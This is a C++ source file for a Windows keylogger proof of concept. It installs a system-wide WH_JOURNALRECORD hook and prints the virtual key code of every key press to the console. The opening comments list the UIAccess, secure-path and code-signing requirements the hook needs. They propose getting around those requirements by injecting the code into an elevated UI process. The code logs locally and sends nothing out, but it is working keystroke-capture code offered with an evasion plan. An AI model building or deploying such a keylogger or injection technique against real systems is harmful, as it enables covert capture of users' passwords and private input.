// WH_JOURNALRECORD is a global system hook and to get access to it the application needs:
// 1. some UAC shit include UIAccess on manifest
// 2. Run from a "secure path" (eg. C:\Program Files\ or C:\Windows\System32, ...)
// 3. Image signed. 
// https://learn.microsoft.com/en-us/answers/questions/167703/wh-journalrecord-hook-blocks-mouse-clicks-keystrok
// Even tried running SYSTEM with a token fully enabled all privs, still access denied. with manifest and no sign (lazy) will get "A referral was returned from the server".
// Easier to just inject this shit into an admin ui process that meets the requirements to install this global hook

#include <windows.h>
#include <iostream>

HHOOK g_hHook = NULL;

// Journal Record Hook Procedure
LRESULT CALLBACK JournalRecordProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        EVENTMSG* pEvent = (EVENTMSG*)lParam;

        // Filter for keyboard events (KeyDown)
        if (pEvent->message == WM_KEYDOWN || pEvent->message == WM_SYSKEYDOWN) {
            // paramL contains the virtual key code for key messages
            std::cout << "Journal Hook VK Code: 0x" << std::hex << (DWORD)pEvent->paramL << std::endl;

            // Check for ESC key press to signal exit
            if (pEvent->paramL == VK_ESCAPE) {
                std::cout << "Escape pressed, signaling exit..." << std::endl;
                PostQuitMessage(0); // Signal the message loop to terminate
            }
        }
        // Could also log pEvent->message, pEvent->paramH, pEvent->time, pEvent->hwnd
        // Note: wParam is not used for WH_JOURNALRECORD
    }

    // VERY IMPORTANT: Call the next hook in the chain
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    std::cout << "Attempting to set WH_JOURNALRECORD hook..." << std::endl;
    std::cout << "Press ESC to exit." << std::endl;

    // Set the system-wide hook
    // WH_JOURNALRECORD hooks are system-wide, so dwThreadId MUST be 0
    g_hHook = SetWindowsHookExW(WH_JOURNALRECORD, JournalRecordProc, hInstance, 0);

    if (g_hHook == NULL) {
        std::cerr << "Failed to install hook! Error: " << GetLastError() << std::endl;
        std::cout << "Press ENTER to exit." << std::endl;
        std::cin.get();
        return 1;
    }

    std::cout << "Hook installed successfully." << std::endl;

    // --- Message Loop ---
    // A message loop is REQUIRED on the thread that called SetWindowsHookEx
    // for Journal hooks to function correctly.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    std::cout << "Unhooking..." << std::endl;
    // Unhook before exiting
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
    }

    return 0;
}